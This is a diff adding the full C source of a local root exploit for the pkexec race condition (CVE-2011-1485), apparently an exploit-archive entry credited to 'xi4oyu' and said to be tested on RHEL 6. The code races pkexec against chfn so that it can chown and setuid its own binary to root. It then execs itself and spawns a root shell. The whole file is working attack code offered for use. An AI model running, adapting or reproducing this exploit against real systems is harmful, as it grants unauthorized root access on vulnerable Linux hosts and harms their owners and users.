@@ -1,0 +1,200 @@
+/*
+* Exploit Title: pkexec Race condition (CVE-2011-1485) exploit
+* Author: xi4oyu
+* Tested on: rhel 6
+* CVE : 2011-1485
+* Linux pkexec exploit by xi4oyu , thx dm@0x557.org * Have fun~ 
+¡Á U can reach us  @ http://www.wooyun.org :)
+*/
+#include <stdio.h>
+#include <limits.h>
+#include <time.h>
+#include <unistd.h>
+#include <termios.h>
+#include <sys/stat.h>
+#include <errno.h>
+#include <poll.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+
+int main(int argc,char *argv[], char ** envp)
+{
+	
+	time_t tim_seed1;
+	pid_t pid_seed2;
+	int result;
+	struct stat stat_buff;
+	
+	char * chfn_path = "/usr/bin/chfn";
+	char cmd_buff[4096];
+	
+	char * pkexec_argv[] = { 
+		"/usr/bin/pkexec",
+		"/bin/sh",
+		"-c",
+		cmd_buff,
+		NULL
+	};
+	int pipe1[2];
+	int pipe2[2];
+	int pipe3[2];	
+	pid_t pid,pid2 ;
+	char * chfn_argv[] = { 
+		"/usr/bin/chfn",
+		NULL
+	};
+
+	char buff[8];
+	char read_buff[4096];
+	char real_path[512];	
+	struct termios termios_p;
+	
+	int count = 0;
+	int flag = 0;
+	int usleep1 = 0;
+	int usleep2 = 0;
+
+	
+	bzero(cmd_buff,4096);
+	bzero(real_path,512);
+	realpath(argv[0],real_path);
+	
+	tim_seed1 = time(NULL);
+	pid_seed2 = getpid();
+	srand(tim_seed1+pid_seed2);
+	
+
+	
+	
+	//get terminal attr
+	tcgetattr(0,&termios_p);
+	snprintf(cmd_buff,4095,"/bin/chown root:root %s; /bin/chmod 4755 %s",real_path,real_path);
+//	printf("Cmd line:%s",cmd_buff);
+	if(! geteuid()){
+	//Succs => r00t!
+		char * exec_argv[2]={
+			"/bin/sh",
+			NULL
+		};
+		setuid(0);
+		setgid(0);
+		execve("/bin/sh",exec_argv,0);
+		perror("execve shell");
+		exit(-1);
+	}
+
+	printf("pkexec local root exploit by xi4oyu , thx to dm\n");
+	
+	if(pipe(pipe1)){
+		perror("pipe");
+		exit(-2);
+	}
+	
+	for(count = 500; count && !flag; count--){
+	
+	//	printf("Count %d\n",count);
+		pid = fork();
+		if( !pid ){
+			// Parent
+			if( !pipe(pipe2)){
+			
+				if(!pipe(pipe3)){
+					pid2 = fork();
+					if(!pid2){
+						// Parent 2
+						close(1);
+						close(2);
+						close(pipe1[0]);
+						dup2(pipe1[1],2);
+						dup2(pipe1[1],1);
+						close(pipe1[1]);
+						close(pipe2[0]);
+						close(pipe3[1]);
+						write(pipe2[1],"\xFF",1);
+						read(pipe3[0],&buff,1);
+										
+						execve(pkexec_argv[0],pkexec_argv,envp);
+						perror("execve pkexec");
+						exit(-3);
+					
+					}
+					close(0);
+					close(1);
+					close(2);
+					close(pipe2[1]);
+					close(pipe3[0]);
+					read(pipe2[0],&buff,1);
+					write(pipe3[1],"\xFF",1);
+					usleep(usleep1+usleep2);
+
+					execve(chfn_argv[0],chfn_argv,envp);
+					perror("execve setuid");
+					exit(1);
+				}
+				
+
+			}
+			perror("pipe3");
+			exit(1);				
+		}
+		
+		//Note: This is child, no pipe3 we use poll to monitor pipe1[0]
+		memset(pipe3,0,8);
+		
+		struct pollfd * pollfd = (struct pollfd *)(&pipe3);
+		pollfd->fd = pipe1[0];
+		pollfd->events =  POLLRDNORM; 
+		
+		if(poll(pollfd,1,1000) < 0){
+		
+			perror("poll");
+			exit(1);
+		}
+		
+		if(pollfd->revents & POLLRDNORM ){
+			memset(read_buff,0,4096);
+			read(pipe1[0],read_buff,4095);
+			if( strstr(read_buff,"does not match")){
+				usleep1 += 500;
+				usleep2 = rand() % 1000;
+			
+			}else{
+				usleep1 -= 500;
+				
+			
+			}
+		
+		
+		}
+		
+		if(!stat(real_path,&stat_buff)){
+			if(!stat_buff.st_uid){
+				if(!stat_buff.st_gid){
+					if(stat_buff.st_mode & 0x800){
+						
+						char *exec_array[]={
+							real_path,
+							NULL
+						};
+						
+						flag = 1;
+						tcsetattr(0,2,&termios_p);
+						execve(real_path,exec_array,0);
+						perror("execve self");
+						exit(1);
+					}
+				}
+			
+			}
+		}
+		
+		tcsetattr(0,2,&termios_p);
+	
+	}
+		result = 0;
+		return result;
+
+}
